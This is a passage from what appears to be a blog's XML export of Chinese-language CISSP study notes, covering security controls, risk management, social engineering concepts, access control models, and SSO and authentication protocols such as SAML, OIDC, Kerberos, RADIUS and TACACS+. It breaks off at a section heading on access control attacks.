title="理解控制类型"></a>理解控制类型</h2><p>术语“安全控制”指执行各种控制任务，例如确保只有授权用户可以登录，以及防止未授权用户访问资源。</p><p>控制类型包括：<br>预防</p><p>检测</p><p>纠正</p><p>威慑</p><p>恢复</p><p>指示</p><p>补偿</p><p>控制也可根据其实施方式分为管理性、逻辑性&#x2F;技术性或物理性控制。</p><h2 id="理解安全控制评估（SCA）"><a href="#理解安全控制评估（SCA）" class="headerlink" title="理解安全控制评估（SCA）"></a>理解安全控制评估（SCA）</h2><p>SCA 是根据基线或可靠性期望对安全基础设施的各个机制进行的正式评估。</p><h2 id="理解安全监控和测量"><a href="#理解安全监控和测量" class="headerlink" title="理解安全监控和测量"></a>理解安全监控和测量</h2><p>安全控制提供的收益应该是可被监控和测量的。</p><p>如果安全控制提供的收益无法被量化、评估或比较，那么这种控制实际上没有提供任何安全。</p><h2 id="理解风险报告"><a href="#理解风险报告" class="headerlink" title="理解风险报告"></a>理解风险报告</h2><p>风险报告涉及风险报告的编制，以及将该报告呈现给利益相关方的过程。</p><p>风险报告应能准确、及时、全面地反映整个组织的情况，能清晰和准确地支持决策的制订，并定期更新。</p><h2 id="了解持续改进的必要性"><a href="#了解持续改进的必要性" class="headerlink" title="了解持续改进的必要性"></a>了解持续改进的必要性</h2><p>安全在不断变化。</p><p>随着时间的推移，任何已实施的安全解决方案都需要进行更新。</p><p>如果已使用的控制措施不能持续改进，则应该将其替换成可扩展的改进控制措施。</p><h2 id="理解风险成熟度模型"><a href="#理解风险成熟度模型" class="headerlink" title="理解风险成熟度模型"></a>理解风险成熟度模型</h2><p>风险成熟度模型（RMM）从成熟、可持续和可重复方面评估风险管理流程的关键指标和活动。</p><p>RMM 分为：<br>初始级</p><p>预备级</p><p>定义级</p><p>集成级</p><p>优化级</p><h2 id="了解遗留系统安全风险"><a href="#了解遗留系统安全风险" class="headerlink" title="了解遗留系统安全风险"></a>了解遗留系统安全风险</h2><p>遗留系统通常是一种威胁，因为它们可能无法从供应商处获得安全更新。</p><p>生产期终止（EOL）是指制造商不再生产产品的时间点。</p><p>服务期终止（EOSL）或支持终止（EOS）是指不能再从供应商处接收更新和支持。</p><h2 id="了解风险框架"><a href="#了解风险框架" class="headerlink" title="了解风险框架"></a>了解风险框架</h2><p>风险框架是关于如何评估、解决和监控风险的指南或方法。</p><p>参考的风险框架主要是：</p><p>NIST SP 800-37 Rev.2 中定义的风险管理框架（RMF）。</p><p>其他风险管理框架还包括：</p><p>ISO&#x2F;IEC 31000</p><p>ISO&#x2F;IEC 31004</p><p>COSO</p><p>IT 风险框架</p><p>OCTAVE</p><p>FAIR</p><p>TARA</p><h2 id="理解社会工程"><a href="#理解社会工程" class="headerlink" title="理解社会工程"></a>理解社会工程</h2><p>社会工程是一种利用人类天性和人类行为的攻击形式。</p><p>常在社会工程中使用的原理有权威、恐吓、共识、稀缺性、熟悉、信任和紧迫性。</p><p>此类攻击可通过使用借口和&#x2F;或前置词来获取信息或访问权限。</p><p>社会工程攻击包括网络钓鱼、鱼叉式网络钓鱼、商业电子邮件泄露（BEC）、网络钓鲸、短信钓鱼、垃圾邮件、肩窥、发票诈骗、恶作剧、假冒、伪装、尾随、捎带、垃圾箱搜寻、身份欺诈、误植域名和影响力运动。</p><h2 id="了解如何实施安全意识培养、培训和教育"><a href="#了解如何实施安全意识培养、培训和教育" class="headerlink" title="了解如何实施安全意识培养、培训和教育"></a>了解如何实施安全意识培养、培训和教育</h2><p>在接受实际的培训前，用户必须建立每个员工都需要具备的安全意识。</p><p>一旦树立了安全意识，就可以开始培训或教导员工执行他们的工作任务并遵守安全策略。</p><p>所有新员工都需要一定程度的培训，这样，他们才会遵守安全策略中规定的所有标准、指南和程序。</p><p>教育是一项更详细的工作，学生&#x2F;用户学习的内容比他们完成工作任务实际需要知道的多得多。</p><p>教育通常是与寻求资质认证或工作晋升的用户相关联。</p><h2 id="了解安全带头人"><a href="#了解安全带头人" class="headerlink" title="了解安全带头人"></a>了解安全带头人</h2><p>安全带头人通常是团队的一员，他决定（或被指派）负责将安全概念运用和集成到团队的工作活动中。</p><p>安全带头人通常是非安全人员，他们负责鼓励他人支持和采用更多的安全实践和行为。</p><h2 id="理解游戏化"><a href="#理解游戏化" class="headerlink" title="理解游戏化"></a>理解游戏化</h2><p>游戏化是指将游戏的常见元素融入其他活动，例如安全合规和行为改变，从而鼓励合规性和参与度。</p><h2 id="了解定期进行内容审查和有效性评估的必要性"><a href="#了解定期进行内容审查和有效性评估的必要性" class="headerlink" title="了解定期进行内容审查和有效性评估的必要性"></a>了解定期进行内容审查和有效性评估的必要性</h2><p>必须定期对所有培训材料进行内容审查。</p><p>审查有助于确保培训材料和演示文稿与业务目标、组织使命和安全目标保持一致。</p><p>应该使用一些验证手段来判定培训是有效益的还是在浪费时间和资源。</p><p>D A B B C</p><p>✅ ✅ ✅ ✅ ✅</p><p>C B D C C</p><p>❌ ✅ ✅ ✅ ✅</p><p>A ACE A B C</p><p>✅ ❌ACD ✅ ❌C ❌B</p><p>BF C ABCD AB D</p><p>✅ ✅ ❌BCD ❌B ✅</p><p>评估了控制因素，就不是忽略风险</p><p>没有和受害者互动，不算社会工程攻击</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>安全带头人</p><p>RMF 级别</p><p>RMM </p><p>风险有效定义</p><p>资产、威胁、脆弱性、暴露、风险</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>14-域3安全架构与工程+域5身份和访问管理（IAM）-控制和监控访问</title>
    <link href="/2025/04/21/security/seccert/cissp/14-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F5%E8%BA%AB%E4%BB%BD%E5%92%8C%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89-%E6%8E%A7%E5%88%B6%E5%92%8C%E7%9B%91%E6%8E%A7%E8%AE%BF%E9%97%AE/"/>
    <url>/2025/04/21/security/seccert/cissp/14-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F5%E8%BA%AB%E4%BB%BD%E5%92%8C%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89-%E6%8E%A7%E5%88%B6%E5%92%8C%E7%9B%91%E6%8E%A7%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="14-1-比较访问控制模型"><a href="#14-1-比较访问控制模型" class="headerlink" title="14.1 比较访问控制模型"></a>14.1 比较访问控制模型</h1><p>授权主体访问客体的方法取决于 IT 系统采用的控制方法。</p><h2 id="14-1-1-比较权限、权利和特权"><a href="#14-1-1-比较权限、权利和特权" class="headerlink" title="14.1.1 比较权限、权利和特权"></a>14.1.1 比较权限、权利和特权</h2><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>指授予对客体的访问权限，并明确允许对客体执行的操作。</p><h3 id="权利"><a href="#权利" class="headerlink" title="权利"></a>权利</h3><p>指对某个客体采取行动的能力。</p><p>权利和权限有细微的区别，并不总是被刻意强调。</p><h3 id="特权"><a href="#特权" class="headerlink" title="特权"></a>特权</h3><p>特权是权利和权限的组合。</p><h2 id="14-1-2-理解授权机制"><a href="#14-1-2-理解授权机制" class="headerlink" title="14.1.2 理解授权机制"></a>14.1.2 理解授权机制</h2><h3 id="隐式拒绝"><a href="#隐式拒绝" class="headerlink" title="隐式拒绝"></a>隐式拒绝</h3><p>访问控制的基本原则是隐式拒绝，大多数授权机制使用隐式拒绝。</p><p>除非明确授予主体访问权限，否则，隐式拒绝原则拒绝主体访问客体。</p><p>也可以视为默认拒绝。</p><h3 id="访问控制矩阵"><a href="#访问控制矩阵" class="headerlink" title="访问控制矩阵"></a>访问控制矩阵</h3><p>访问控制矩阵是一种包含主体、客体和分配权限的表格。</p><p>访问控制矩阵并非只是一个访问控制列表（ACL），存在多维控制列表。</p><h3 id="能力表"><a href="#能力表" class="headerlink" title="能力表"></a>能力表</h3><p>能力表（capability table）是另一种确定主体所分配权限的方式。</p><p>能力表主要关注的是主体（用户、组或角色），体现主体可以访问的客体信息。</p><p>ACL 主要关注客体，体现能够访问某个客体的主体信息。</p><h3 id="约束接口"><a href="#约束接口" class="headerlink" title="约束接口"></a>约束接口</h3><p>应用程序利用受约束或受限制的接口，限制用户可执行或可查看的内容。</p><p>常见方法：</p><p>用户无权使用某功能时隐藏该功能。</p><p>和 Clark-Wilson 模型 相关联</p><h3 id="基于内容的控制"><a href="#基于内容的控制" class="headerlink" title="基于内容的控制"></a>基于内容的控制</h3><p>基于内容的访问控制依据客体内容来限制对数据的访问。</p><p>例如：数据库视图就是一种基于内容的控制。</p><h3 id="基于上下文的控制"><a href="#基于上下文的控制" class="headerlink" title="基于上下文的控制"></a>基于上下文的控制</h3><p>基于上下文的访问控制在授予用户权限之前需要用户执行特定的活动。</p><p>基于上下文的控制也可以使用日期和时间控件，在允许时间之外访问会被拒绝。</p><h3 id="因需可知"><a href="#因需可知" class="headerlink" title="因需可知"></a>因需可知</h3><p>确保主体仅能够访问为完成工作任务和工作职能而需要知道的内容。</p><p>只给需要的权限。</p><h3 id="最小特权"><a href="#最小特权" class="headerlink" title="最小特权"></a>最小特权</h3><p>最小特权原则确保主体仅拥有执行工作任务和工作职能所需的权限。</p><p>最小特权和因需可知的区别：<br>最下特权包括在系统上执行操作的权利，也就是可以在系统上执行的能力。</p><h3 id="职责分离"><a href="#职责分离" class="headerlink" title="职责分离"></a>职责分离</h3><p>确保将敏感职能划分为两个或多个员工共同执行的任务。</p><p>通过创建一个检查和制衡系统，防止欺诈和错误的发生。</p><h2 id="14-1-3-使用安全策略定义需求"><a href="#14-1-3-使用安全策略定义需求" class="headerlink" title="14.1.3 使用安全策略定义需求"></a>14.1.3 使用安全策略定义需求</h2><p>安全策略是一种定义组织安全需求的文档，确定了组织需要保护的资产、安全解决方案以及需要保护的程度。</p><p>可以单个文档，也可以多个文档。</p><p>安全策略是实现安全需求的指南，也就是方向，而不是具体的实施操作</p><h2 id="14-1-4-介绍访问控制模型"><a href="#14-1-4-介绍访问控制模型" class="headerlink" title="14.1.4 介绍访问控制模型"></a>14.1.4 介绍访问控制模型</h2><h3 id="自主访问控制-DAC"><a href="#自主访问控制-DAC" class="headerlink" title="自主访问控制 DAC"></a>自主访问控制 DAC</h3><p>自主访问控制（DAC）模型的一个关键特征是每个客体都有一个所有者，所有者可以允许或拒绝其他主体的访问。</p><p>实例：</p><p>微软 Windows 的 NTFS 文件系统使用 DAC 模型。</p><h3 id="基于角色的访问控制-RBAC"><a href="#基于角色的访问控制-RBAC" class="headerlink" title="基于角色的访问控制 RBAC"></a>基于角色的访问控制 RBAC</h3><p>基于角色的访问控制（RBAC）模型的一个关键特征是角色或组的使用。</p><p>不直接向用户分配权限，而是向角色分配权限。</p><p>角色通常基于职责功能来定义。</p><p>实例：</p><p>微软 Windows 操作系统使用组来实现 RBAC 模型。</p><h3 id="基于规则的访问控制"><a href="#基于规则的访问控制" class="headerlink" title="基于规则的访问控制"></a>基于规则的访问控制</h3><p>基于规则的访问控制模型的一个关键特征是采用适用于所有主体的全局规则。</p><p>规则也被称为“限制” 或 “过滤器”。</p><p>例如防火墙。</p><h3 id="基于属性的访问控制-ABAC"><a href="#基于属性的访问控制-ABAC" class="headerlink" title="基于属性的访问控制 ABAC"></a>基于属性的访问控制 ABAC</h3><p>基于属性的访问控制 ABAC 模型的一个关键特征是使用包含多个属性的规则。</p><p>ABAC 基于属性的比基于规则的更灵活。</p><h3 id="强制访问控制-MAC"><a href="#强制访问控制-MAC" class="headerlink" title="强制访问控制 MAC"></a>强制访问控制 MAC</h3><p>强制访问控制模型 MAC 的一个关键特征是使用应用于主体和客体的标签。</p><p>基于标签。</p><p>MAC 强制访问控制模型被称为基于格子的模型。</p><h3 id="基于风险的访问控制"><a href="#基于风险的访问控制" class="headerlink" title="基于风险的访问控制"></a>基于风险的访问控制</h3><p>基于风险的访问控制模型在评估风险后授予访问权限。</p><p>运用机器学习并根据过去的活动对当前活动做出预测。</p><h2 id="14-1-5-自主访问控制"><a href="#14-1-5-自主访问控制" class="headerlink" title="14.1.5 自主访问控制"></a>14.1.5 自主访问控制</h2><p>自主访问控制系统，允许客体的所有者、创建者或数据所有者、数据托管员控制和定义对客体的访问。</p><p>所有客体都拥有所有者，访问控制权基于所有者的自由裁量权或决定权。</p><p>基于身份的访问控制是自主访问控制DAC的子集。</p><p>使用客体访问控制列表ACL实现 DAC 模型。</p><p>微软 Windows 系统使用 DAC 模型来管理文件，每个文件或文件夹都有一个 ACL。</p><h2 id="14-1-6-非自主访问控制"><a href="#14-1-6-非自主访问控制" class="headerlink" title="14.1.6 非自主访问控制"></a>14.1.6 非自主访问控制</h2><h3 id="自主和非自主的区别"><a href="#自主和非自主的区别" class="headerlink" title="自主和非自主的区别"></a>自主和非自主的区别</h3><p>自主访问控制：</p><p>允许所有者自行修改，也不会影响环境的其他部分。</p><p>非自主访问控制：</p><p>管理员集中管理，可以实施影响整体环境的变更。</p><h3 id="1-基于角色的访问控制-RBAC"><a href="#1-基于角色的访问控制-RBAC" class="headerlink" title="1. 基于角色的访问控制 RBAC"></a>1. 基于角色的访问控制 RBAC</h3><p>采用基于角色或基于任务的访问控制系统，根据主体角色或分配任务来定义访问客体的能力。</p><p>基于角色的访问控制 RBAC 通常通过组来实现。</p><p>RBAC 基于角色的访问控制可以预防特权蠕变，有助于加强最小特权原则的实施。</p><p>特权蠕变是特权不断增加的意思。</p><p>直接分配的权限，很难识别和撤销。</p><p>管理员只需要从组中删除用户的账户即可轻松撤销不必要的权限。</p><p>管理员按职务描述或工作职能识别角色或组。</p><p>用户可以属于多个角色或组。</p><p>微软操作系统通过组来实现 RBAC。</p><h4 id="DAC-和-RBAC-区别"><a href="#DAC-和-RBAC-区别" class="headerlink" title="DAC 和 RBAC 区别"></a>DAC 和 RBAC 区别</h4><p>部署和使用方式不同。</p><p>DAC 中，客体的所有者决定权限。</p><p>RBAC 中，管理员确定主体权限。</p><h4 id="TBAC-和-RBAC"><a href="#TBAC-和-RBAC" class="headerlink" title="TBAC 和 RBAC"></a>TBAC 和 RBAC</h4><p>TBAC ：基于任务的访问控制，重点是通过分配的任务来控制访问。</p><h3 id="2-基于规则的访问控制"><a href="#2-基于规则的访问控制" class="headerlink" title="2. 基于规则的访问控制"></a>2. 基于规则的访问控制</h3><p>基于规则的访问控制模型使用一组规则、限制或过滤器，决定系统允许和禁止发生的操作。</p><p>显著特征：具有适用于所有主体的全局规则。</p><p>常见实例：</p><p>防火墙</p><p>防火墙包含一个最终规则（即隐式拒绝规则）。</p><h3 id="3-基于属性的访问控制-ABAC"><a href="#3-基于属性的访问控制-ABAC" class="headerlink" title="3. 基于属性的访问控制 ABAC"></a>3. 基于属性的访问控制 ABAC</h3><p>基于属性的访问控制 ABAC 模型是基于规则的访问控制的高级实现方式。</p><p>ABAC 模型使用包含多个规则属性的策略。</p><p>属性可以是用户、网络和网络上的设备的几乎任何特征。</p><p>许多软件定义工程（SDN）应用程序使用 ABAC 模型。</p><p>ABAC 模型改进了基于规则的访问控制模型。</p><p>基于规则的访问控制模型适用于所有用户，但 ABAC 基于属性的访问控制模型可以更加具体。</p><h3 id="4-强制访问控制-MAC"><a href="#4-强制访问控制-MAC" class="headerlink" title="4. 强制访问控制 MAC"></a>4. 强制访问控制 MAC</h3><p>强制访问控制（MAC）模型依赖分类标签的使用。</p><p>一个分类标签代表一个安全域或安全领域。</p><p>安全域是共享相同安全策略的主体和客体的集合。</p><p>用户根据许可级别获得标签，许可级别是一种特权形式。</p><p>私营组织经常使用机密&#x2F;专有、私有、敏感和公开等标签。</p><p>MAC模型通常被称为基于格子的模型。</p><p><img src="/image-20250605230200590.png" alt="image-20250605230200590"></p><p>标有“机密”、“私有”、“敏感” 和 “公开”的水平线标识了分类级别的上限。拥有敏感标签的用户可以访问敏感和公开之间的敏感数据。</p><p>MAC 强制访问控制模型允许标签标识出更多定义的安全域。不同安全域放在单独的隔离区进行维护，以提供额外的保护层。</p><p>用户需要分类标签和安全域标签才可以访问指定数据，例如：Foil 区域的数据需要 Foil 和 机密标签。</p><p>敏感数据（公开边界和敏感边界之间）没有任何其他标签，可以授权拥有敏感标签的用户访问具有敏感标签的任何数据。</p><p>组织员工识别标签，定义标签含义和获得标签的需求，管理员分配给主体和客体。</p><p>MAC 强制访问控制模型 中使用隔离区，也就是不同的安全域，有助于加强因需可知原则。</p><p>MAC 强制访问控制模型是禁止性的，不是允许性的，遵循隐式拒绝原则。</p><p>MAC 模型比 DAC 模型更安全，但 MAC模型不具有灵活性和可扩展性。</p><p>安全分类代表敏感度级别，未分类的标签是最不敏感的数据。</p><h5 id="MAC-模型的分类环境"><a href="#MAC-模型的分类环境" class="headerlink" title="MAC 模型的分类环境"></a>MAC 模型的分类环境</h5><h6 id="分层环境"><a href="#分层环境" class="headerlink" title="分层环境"></a>分层环境</h6><p>分层环境将各种分类标签关联到按低安全性、中等安全性、高安全性排序的结果。</p><p>高级别允许访问低级别，低级别不允许访问高级别。</p><h6 id="分区环境"><a href="#分区环境" class="headerlink" title="分区环境"></a>分区环境</h6><p>安全域之间是无关联的，每个域代表单独的隔离区。</p><h6 id="混合环境"><a href="#混合环境" class="headerlink" title="混合环境"></a>混合环境</h6><p>混合环境结合了分层和分区的概念，每个分层级别可能包含多个子分区，子分区之间是相互隔离的。</p><p>实现了访问的精细化控制，随着规模增大，混合 MAC 环境越来越难以管理。</p><h3 id="5-基于风险的访问控制"><a href="#5-基于风险的访问控制" class="headerlink" title="5. 基于风险的访问控制"></a>5. 基于风险的访问控制</h3><p>较新</p><p>实现复杂</p><h4 id="研究的元素"><a href="#研究的元素" class="headerlink" title="研究的元素"></a>研究的元素</h4><ul><li><p>环境</p><p>使用 IP 地址人的地理位置等信息</p></li><li><p>情景</p><p>包含“设备正在做什么”</p></li><li><p>安全策略</p><p>​代码软件，依据现有数据所出基于风险的决策。</p></li></ul><p>权限授予之前，检查或要求的措施：<br><strong>多因素身份认证</strong>：拒绝使用一种身份认证因素的用户访问</p><p><strong>合规的移动设备</strong>：要求设备满足特定的安全需求，例如最新的操作系统和设备加密等。</p><p>基于风险的访问控制模型可以使用二进制规则来控制访问。</p><p>移动设备管理（MDM）配合。</p><h1 id="14-2-实现认证系统"><a href="#14-2-实现认证系统" class="headerlink" title="14.2 实现认证系统"></a>14.2 实现认证系统</h1><p>FIM：联合身份管理</p><p>SSO：单点登录</p><p>FIM 允许不同组织联合使用 SSO。</p><h2 id="14-2-1-互联网上实现-SSO"><a href="#14-2-1-互联网上实现-SSO" class="headerlink" title="14.2.1 互联网上实现 SSO"></a>14.2.1 互联网上实现 SSO</h2><h3 id="1-XML"><a href="#1-XML" class="headerlink" title="1. XML"></a>1. XML</h3><p>可扩展标记语言（XML）包含标记，从而描述所需要的数据。</p><p>依托 XML 格式导入导出数据，使 XML 称为交换信息的通用语言。</p><p>云服务商使用 XML 或 基于 XML  的其他语言。</p><h3 id="2-SAML"><a href="#2-SAML" class="headerlink" title="2. SAML"></a>2. SAML</h3><p>安全断言标记语言（SAML）是一种基于 XML的开放标准，通常用于在联邦组织之间交换身份认证和授权（AA）信息。</p><p>SAML 提供支持浏览器访问的 SSO 功能。</p><p>结构化信息标准促进组织（OASIS）。</p><p>2005 年 SAML 2.0 被纳入 OASIS 标准。</p><p>SAML 2.0 规范使用三个实体：委托人、服务提供商和身份提供者。</p><p><strong>委托人或用户代理</strong>：用户</p><p><strong>服务提供商</strong>（SP）：站点</p><p><strong>身份提供者（IdP）</strong>：持有身份认证和授权信息的第三方</p><p>身份提供者 IdP 发送三种类型 XML 消息（称为声明）</p><p><strong>认证声明</strong>：</p><p>证明用户代理提供了正确的身份凭证，标识身份认证方法，并表示用户代理登录时间</p><p><strong>授权声明</strong>：</p><p>表明用户代理是否有权访问所请求的服务。如果拒绝，会说明原因。</p><p><strong>属性声明</strong>：</p><p>关于用户代理的任何信息。</p><h3 id="3-OAuth"><a href="#3-OAuth" class="headerlink" title="3. OAuth"></a>3. OAuth</h3><p>OAuth 2.0 ：开放授权，是RFC 维护的一个授权框架。</p><p>OAuth 2.0 不向后兼容 OAuth 1.0。</p><h3 id="4-OpenID"><a href="#4-OpenID" class="headerlink" title="4. OpenID"></a>4. OpenID</h3><p>OpenID 也是一个开放标准。</p><p>提供去中心化身份认证，允许用户使用一组凭证登录多个不相关的网站，凭证由第三方服务维护，也就是 OpenID 提供方。</p><p>OpenID 标识符在前台交换，易于发现。</p><h3 id="5-OIDC"><a href="#5-OIDC" class="headerlink" title="5. OIDC"></a>5. OIDC</h3><p>OpenID Connect （OIDC）是使用 OAuth 2.0 授权框架的身份认证层。</p><p>OIDC 同时提供身份认证和授权。</p><p>OIDC 建立在 OpenID 创建的技术之上，使用 JavaScript 对象表示法（JSON）Web 令牌（JWT），也可以称为 ID 令牌。</p><p>JWT 提供身份认证，包含用户个人资料信息。</p><p>OIDC 过程大部分在后台。</p><p>OAuth 和 OIDC 组合使用，OAuth 提供授权，OIDC 使用 OAuth 框架来授权，并使用 OpenID 技术进行身份认证。</p><h3 id="6-比较-SAML、OAuth、OpenID-和-OIDC"><a href="#6-比较-SAML、OAuth、OpenID-和-OIDC" class="headerlink" title="6. 比较 SAML、OAuth、OpenID 和 OIDC"></a>6. 比较 SAML、OAuth、OpenID 和 OIDC</h3><h4 id="SAML-要点"><a href="#SAML-要点" class="headerlink" title="SAML 要点"></a>SAML 要点</h4><ul><li>SAML 2.0 是一种基于 XML 的开放标准。</li><li>OASIS  在 2005 年 将 SAML 2.0  纳入标准。</li><li>SAML 2.0 使用三个实体，即主体（用户）、服务提供商SP（网络）、身份提供者IdP（持有认证和授权信息的第三方）</li><li>SAML 可以提供主体的认证、授权和属性信息。</li></ul><h4 id="OAuth-要点"><a href="#OAuth-要点" class="headerlink" title="OAuth 要点"></a>OAuth 要点</h4><ul><li>OAuth 是一个授权框架，而不是一个认证协议。</li><li>RFC 6749 描述了 OAuth2.0</li><li>OAuth 使用 API  交换信息</li><li>应用程序从身份提供者那里获取访问令牌</li><li>应用程序包含用于授权的访问令牌</li></ul><h4 id="OpenID-要点"><a href="#OpenID-要点" class="headerlink" title="OpenID 要点"></a>OpenID 要点</h4><ul><li>OpenID 是一种身份认证标准。</li><li>OpenID Foundation 维护。</li><li>OpenID 提供商提供去中心的身份认证。</li><li>用户在站点上输入 OpenID 标识符，OpenID 提供商会验证次标识符。</li></ul><h4 id="OIDC-要点"><a href="#OIDC-要点" class="headerlink" title="OIDC 要点"></a>OIDC 要点</h4><ul><li>OIDC 是 使用 OAuth 2.0 的身份认证层。</li><li>建立在 OpenID 身份认证标准之上。</li><li>提供身份认证和授权</li><li>建立在 OpenID 之上，但使用 JSON Web （JWT）令牌</li></ul><h2 id="14-2-2-在内部网络上实现-SSO"><a href="#14-2-2-在内部网络上实现-SSO" class="headerlink" title="14.2.2 在内部网络上实现 SSO"></a>14.2.2 在内部网络上实现 SSO</h2><p>重点关注 Kerberos 。</p><p>远程访问协议：RAUDIUS 和 TACACS+</p><h3 id="1-AAA-协议"><a href="#1-AAA-协议" class="headerlink" title="1. AAA 协议"></a>1. AAA 协议</h3><p>提供身份认证、授权和计费的协议被称为 AAA 协议。</p><p>AAA 协议通过远程访问系统，例如VPN，提供集中式访问控制。</p><p>AAA 协议使用身份标识、身份认证、授权和问责制的访问控制要素。</p><p>计费要素可以跟踪用户的网络资源使用情况。</p><h3 id="2-Kerberos"><a href="#2-Kerberos" class="headerlink" title="2. Kerberos"></a>2. Kerberos</h3><p>票证身份认证是一种采用第三方实体来证明身份并提供身份认证的机制。</p><p>Kerberos 主要目的是身份认证，签发票证，访问资源时提供票证。</p><p>Kerberos 为用户提供单点登录解决方案并保护登录凭证。</p><p>Kerberos 第 5 版基于 AES 对称加密协议，实现对称密钥加密（也称为密钥加密）。</p><p>Kerberos 使用端到端安全，为身份认证流量提供保密性和完整性，并可以预防窃听和重放攻击。</p><h4 id="kerberos-要素"><a href="#kerberos-要素" class="headerlink" title="kerberos 要素"></a>kerberos 要素</h4><h5 id="密钥分发中心"><a href="#密钥分发中心" class="headerlink" title="密钥分发中心"></a>密钥分发中心</h5><p>密钥分发中心是提供身份认证服务的可信第三方。</p><p>使用对称加密技术。</p><p>所有客户端和服务器都需要向 KDC 注册。</p><p>KDC 维护所有网络成员的密钥。</p><h5 id="Kerberos身份认证服务器"><a href="#Kerberos身份认证服务器" class="headerlink" title="Kerberos身份认证服务器"></a>Kerberos身份认证服务器</h5><p>身份认证服务器承载 KDC 的功能：票证授予服务（TGS）和身份认证服务（AS）</p><p>KDC ？</p><h5 id="票证"><a href="#票证" class="headerlink" title="票证"></a>票证</h5><p>票证是一种加密消息，可证明主体被授权访问对象。</p><p>票证也被称为服务票证（ST）。</p><p>主体（如用户）请求访问对象（如文件）的票证，如果已通过认证和授权，Kerberos 会颁发票证。</p><p>Kerberos 票证具有特定的生命周期和使用参数。</p><h5 id="票证授予的票证"><a href="#票证授予的票证" class="headerlink" title="票证授予的票证"></a>票证授予的票证</h5><p>票证授予的票证（TGT）提供证据，证明主体已通过 KDC 的身份认证并且可以请求票证来访问其他对象。</p><p>TGT 是经过加密的，包括对称密钥、到期时间和用户 IP 地址。</p><h5 id="Kerberos-主体"><a href="#Kerberos-主体" class="headerlink" title="Kerberos 主体"></a>Kerberos 主体</h5><p>Kerberos 向 Kerberos 主体发出票证。</p><p>Kerberos 主体通常是用户，但也可以是请求票证的任何实体。</p><h5 id="Kerberos-领域"><a href="#Kerberos-领域" class="headerlink" title="Kerberos 领域"></a>Kerberos 领域</h5><p>一般而言，领域是指由某物控制或统治的区域。</p><p>kerberos 领域是由 Kerberos 控制的逻辑区域（如域）。</p><p>领域内的主体可以从 Kerberos 请求票证，而 kerberos 可以向领域内的主体发出票证。</p><p>Kerberos 的账户数据库存储在目录服务中，例如微软的目录服务 AD。</p><p>Kerberos 在客户端、网络服务器和 KDC 之间交换票证。</p><p>加密票证可以确保登录凭证、会话密钥和身份认证消息永远不会以明文形式传输。</p><p>Kerberos 登录流程工作原理：</p><p>1、用户在客户端输入用户名和密码</p><p>2、客户端使用 AES 对用户名和密码进行加密并将其传输的 KDC（认证服务器）</p><p>3、KDC 根据已知的凭证数据库来验证用户名</p><p>4、KDC 生成一个对称密钥，密钥由客户端和 Kerberos 服务器使用</p><p>KDC 使用用户口令的哈希值对密钥进行加密，KDC 生成一个加密的附带时间戳的 TGT </p><p>5、KDC（认证服务器）将加密的对称密钥、加密的带时间戳的 TGT 传输给客户端</p><p>6、客户端存储 TGT 使用，直到过期</p><p>客户端使用用户口令的哈希值来解密对称密钥。</p><p>客户端的口令永远不会通过网络传输，只是进行验证。也就是通过 KDC 生成的对称密钥。</p><p>客户端访问对象资源时，必须通过 Kerberos 服务器获得服务票证，用 TGT 换 服务票证</p><p>步骤：</p><p>1、客户端将自己的 TGT 发送到 KDC（认证服务器），并请求访问资源</p><p>2、KDC 验证 TGT  是否有效并检查其访问控制矩阵，进而验证用户是否具有足够的权限来访问请求资源。</p><p>3、KDC （认证服务器）生成服务票证并将其发送到客户端。</p><p>4、客户端将服务票证发送到托管资源的服务器或服务</p><p>5、托管资源的服务器或服务通过 KDC （认证服务器）验证票证的有效性</p><p>6、一旦验证通过，Kerberos 活动结束，客户端和服务端建立会话，进行通信。</p><p>Kerberos 是一种通用身份认证机制，适用于本地局域网、远程访问和客户端&#x2F;服务器资源请求。</p><p>Kerberos 存在单点故障风险，KDC 数据泄露，会导致每个系统的密钥都被泄露；KDC 脱机将无法进行主体身份认证。</p><p>Kerberos 具有严格的时间要求，默认配置要求所有系统保持 5 分钟以内的时间同步。</p><p>网络内部配置时间同步系统，AD域内，一个域控制器（DC）与 NTP 服务器保持时间同步，其他 DC 服务器与第一个 DC  服务器保持同步。</p><h3 id="3-RADIUS"><a href="#3-RADIUS" class="headerlink" title="3. RADIUS"></a>3. RADIUS</h3><p>远程认证拨入用户服务（RADIUS）集中认证远程访问连接，例如 VPN。</p><p>RADIUS 适用于组织拥有多台网络访问服务器（或远程访问服务器）的情况。</p><p>用户 -&gt;  网络访问服务器（RADIUS的客户端） -&gt; RADIUS 服务器（身份认证服务器）。</p><p>互联网服务器提供商（ISP）使用 RADIUS 实施身份认证。</p><p>用户 -&gt; ISP -&gt; RADIUS 服务器</p><p>组织也可以使用 RADIUS ，且通常基于位置的安全来实现 RADIUS。</p><p>RADIUS 默认使用用户数据报协议（UDP），仅加密口令的交互过程。</p><p>RFC 6614 定义可以使用传输控制协议 TCP 上的传输层安全性（TLS）对整个会话进行加密，RADIUS 使用 TCP 2083 端口。</p><p>RADIUS 使用 UDP 1812 端口传输 RADIUS 消息，使用 UDP 1813 端口传输 RADIUS 计费信息。</p><h3 id="4-TACACS"><a href="#4-TACACS" class="headerlink" title="4. TACACS+"></a>4. TACACS+</h3><p>Cisco 开发了增强型终端访问控制器访问控制系统（TACACS+）。</p><p>TACACS+ 将身份认证、授权和计费划分为独立的进程，可以部署在不同服务器上。</p><p>与 RADIUS 一样，TACACS+可以加密所有身份认证信息（口令+会话）。</p><p>TACACS+ 使用 TCP 49 端口。可靠性更高。</p><h1 id="14-3-了解访问控制攻击"><a href="#14-3-了解访问控制攻击" class="headerlink" 